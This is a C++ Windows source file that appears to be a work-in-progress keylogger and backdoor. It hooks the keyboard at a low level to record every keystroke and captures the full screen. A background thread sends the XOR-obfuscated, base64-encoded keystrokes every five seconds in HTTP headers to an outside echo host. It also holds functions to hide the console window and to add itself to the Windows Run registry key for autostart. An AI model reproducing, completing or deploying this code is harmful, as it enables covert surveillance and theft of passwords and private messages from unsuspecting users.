#include <iostream>
#include "lodepng.h"
#include "base64.h"
#include "HTTPRequest.hpp"
#include <windows.h>
#include <thread>
#include <deque>
#include <mutex>




HHOOK hHook = NULL;
bool capsLock = false;

std::string recordedKeystrokes = "";

std::mutex recordedKeystrokesMutex;

std::string XOR(std::string message, std::string key)
{
    std::string processedMessage = message;
    int message_length = message.size();
    int key_length = key.size();
    for(int i = 0;i<message_length;i++)
    {
        processedMessage[i] = message[i]^key[i%key_length];
    }

    return processedMessage;
}


void addToRecordedKeystrokes(std::string value)
{
    std::unique_lock<std::mutex> lock(recordedKeystrokesMutex);
    recordedKeystrokes += value;
}



std::string getRecordedKeystrokes()
{
    std::unique_lock<std::mutex> lock(recordedKeystrokesMutex);
    return recordedKeystrokes;
}





void sendGetRequest(std::string url)
{
    try
    {
        // you can pass http::InternetProtocol::V6 to Request to make an IPv6 request
        http::Request request{url};
        const std::vector<unsigned char> body{};

        std::vector<std::pair<std::string, std::string>> headers;

        headers.emplace_back(std::pair<std::string,std::string>("imageBase64Encoded","blablub"));
        headers.emplace_back(std::pair<std::string,std::string>("recordedKeystrokes",base64_encode(XOR(getRecordedKeystrokes(),"ohlongjohnson"))));

        // send a get request
        const auto response = request.send("GET",body,headers);

        std::cout << std::string{response.body.begin(), response.body.end()} << '\n'; // print the result
    }
    catch (const std::exception& e)
    {
        std::cerr << "Request failed, error: " << e.what() << '\n';
    }

}

void sendPostRequest(std::string url)
{
    try
    {
        http::Request request{url};
        const std::string body = "foo=1&bar=baz";

        const auto response = request.send("POST", body, {
                                                             {"Content-Type", "application/x-www-form-urlencoded"}
                                                         });

        std::string result(response.body.begin(), response.body.end());
        std::cout << result << '\n';
    }
    catch (const std::exception& e)
    {
        std::cerr << "Request failed: " << e.what() << '\n';
    }
}

void deliveryThread()
{
    for(;;)
    {
        Sleep(5000);
        sendGetRequest("http://echo.free.beeceptor.com");
        //sendPostRequest("http://echo.free.beeceptor.com");
    }

}


std::string convertUnsignedCharVectorToString(std::vector<unsigned char> vector)
{
    std::string s = "";

    for(auto &uc : vector)
    {
        s += (char)uc;
    }
    return s;
}

std::vector<unsigned char> convertStringToUnsignedCharVector(std::string s)
{
    std::vector<unsigned char> vector;

    for(auto &c : s)
    {
        vector.emplace_back((unsigned char)c);
    }

    return vector;
}


LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM lParam) {
    if (code >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD wVirtKey = kbdStruct->vkCode;
        DWORD wScanCode = kbdStruct->scanCode;

        BYTE lpKeyState[256];
        GetKeyboardState(lpKeyState);


        if (wVirtKey == VK_BACK)
        {
            addToRecordedKeystrokes("[Backspace]");
            //recordedKeystrokes += "[Backspace]";
            return CallNextHookEx(hHook, code, wParam, lParam);
        }
        else if(wVirtKey == VK_RETURN)
        {
            addToRecordedKeystrokes("[Return]");
            //recordedKeystrokes += "[Return]";
            return CallNextHookEx(hHook, code, wParam, lParam);
        }


        if (wVirtKey == VK_CAPITAL)
        {
            capsLock = !capsLock;
        }

        lpKeyState[VK_CAPITAL] = capsLock ? 0x01 : 0x00;


        // Shift
        if (GetAsyncKeyState(VK_LSHIFT) & 0x8000)
            lpKeyState[VK_LSHIFT] = 0x80;

        if (GetAsyncKeyState(VK_RSHIFT) & 0x8000)
            lpKeyState[VK_RSHIFT] = 0x80;

        if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000) ||
            (GetAsyncKeyState(VK_RSHIFT) & 0x8000))
        {
            lpKeyState[VK_SHIFT] = 0x80;
        }

        // Ctrl
        if (GetAsyncKeyState(VK_LCONTROL) & 0x8000)
            lpKeyState[VK_LCONTROL] = 0x80;

        if (GetAsyncKeyState(VK_RCONTROL) & 0x8000)
            lpKeyState[VK_RCONTROL] = 0x80;

        if ((GetAsyncKeyState(VK_LCONTROL) & 0x8000) ||
            (GetAsyncKeyState(VK_RCONTROL) & 0x8000))
        {
            lpKeyState[VK_CONTROL] = 0x80;
        }

        // Alt / AltGr
        if (GetAsyncKeyState(VK_LMENU) & 0x8000)
            lpKeyState[VK_LMENU] = 0x80;

        if (GetAsyncKeyState(VK_RMENU) & 0x8000)
            lpKeyState[VK_RMENU] = 0x80;

        if ((GetAsyncKeyState(VK_LMENU) & 0x8000) ||
            (GetAsyncKeyState(VK_RMENU) & 0x8000))
        {
            lpKeyState[VK_MENU] = 0x80;
        }




        wchar_t wbuffer[64] = { 0 };


        int result = ToUnicodeEx(wVirtKey,wScanCode,lpKeyState,wbuffer,sizeof(wbuffer)/sizeof(wbuffer[0]),0,GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));


        if (result > 0)
        {
            char buffer[64] = { 0 };
            WideCharToMultiByte(CP_UTF8, 0, wbuffer, result, buffer, sizeof(buffer) / sizeof(char), NULL, NULL);

            addToRecordedKeystrokes(buffer);
            //recordedKeystrokes += buffer;
            //std::cout << recordedKeystrokes << std::endl;
            //sendGetRequest("http://echo.free.beeceptor.com");
        }


    }

    return CallNextHookEx(hHook, code, wParam, lParam);
}

void hideConsoleWindow()
{
    ShowWindow(GetConsoleWindow(),SW_HIDE);
}

void showConsoleWindow()
{
    ShowWindow(GetConsoleWindow(),SW_SHOW);
}

void addToAutostart()
{

    HKEY hkey = NULL;
    LPCSTR lpSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    DWORD pathSize=255;
    char executablePath[pathSize];

    //Gets the path of the executable file
    GetModuleFileNameA(NULL,executablePath,pathSize);
    LSTATUS lResult = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_WRITE, &hkey);

    if(lResult == ERROR_SUCCESS)
    {
        RegSetValueEx(hkey,(LPCSTR)"ReACDoor",0,REG_SZ,(const unsigned char*)executablePath,strlen(executablePath));
        RegCloseKey(hkey);
    }

}

std::vector<unsigned char> getScreenshot()
{
    int x  = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y  = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    std::cout << x << std::endl;
    std::cout << y << std::endl;
    std::cout << cx << std::endl;
    std::cout << cy << std::endl;

    std::vector<unsigned char> png;


    HDC dcScreen = GetDC(NULL);
    HDC dcTarget = CreateCompatibleDC(dcScreen);


    BITMAPINFO bi{};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = cx;
    bi.bmiHeader.biHeight = -cy;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;


    void* pixels = nullptr;

    HBITMAP bmpTarget = CreateDIBSection(dcScreen, &bi, DIB_RGB_COLORS, &pixels, NULL, 0);


    if (!bmpTarget)
    {
        DeleteDC(dcTarget);
        ReleaseDC(NULL, dcScreen);
        return{};
    }


     HGDIOBJ oldBmp = SelectObject(dcTarget, bmpTarget);

    BitBlt(dcTarget,0, 0, cx, cy, dcScreen, x, y, SRCCOPY | CAPTUREBLT);


    //BGRA to RGBA
    std::vector<unsigned char> rgba(cx * cy * 4);

    unsigned char* src =
        static_cast<unsigned char*>(pixels);

    for (int i = 0; i < cx * cy; ++i)
    {
        rgba[i * 4 + 0] = src[i * 4 + 2]; // R
        rgba[i * 4 + 1] = src[i * 4 + 1]; // G
        rgba[i * 4 + 2] = src[i * 4 + 0]; // B
        rgba[i * 4 + 3] = 255;             // A
    }


    unsigned error = lodepng::encode(png, rgba, cx, cy, LCT_RGBA, 8);

    SelectObject(dcTarget, oldBmp);
    DeleteDC(dcTarget);
    ReleaseDC(NULL,dcScreen);
    DeleteObject(bmpTarget);

    return png;
}



int main()
{
    //sets dpi process awareness to prevent the getsystemmetrics functions from returning false values
    SetProcessDPIAware();
    SetConsoleOutputCP(CP_UTF8);
    //hideConsoleWindow();

    //addToAutostart();

    std::string screenB64 = base64_encode(convertUnsignedCharVectorToString(getScreenshot()));
    lodepng::save_file(convertStringToUnsignedCharVector(base64_decode(screenB64)),"test.png");
    capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
    if (hHook == NULL)
    {
        std::cerr << "Keyboard hook failed!" << std::endl;
        return 1;
    }


    std::string m = "Hast du mal ne Kippe?";
    std::string k = "geheimnisvolles geheimpasswort";

    /*std::cout<< "Before Encryption:" << m << std::endl;
    m = XOR(m,k);
    std::cout << "After Encryption:" << std::endl;
    std::cout << m;
    std::cout << std::endl;
    m = XOR(m,k);
    std::cout << "After Decryption:" << m << std::endl;*/

    std::thread b(deliveryThread);
    while (GetMessage(NULL, NULL, 0, 0));


    return 0;
}
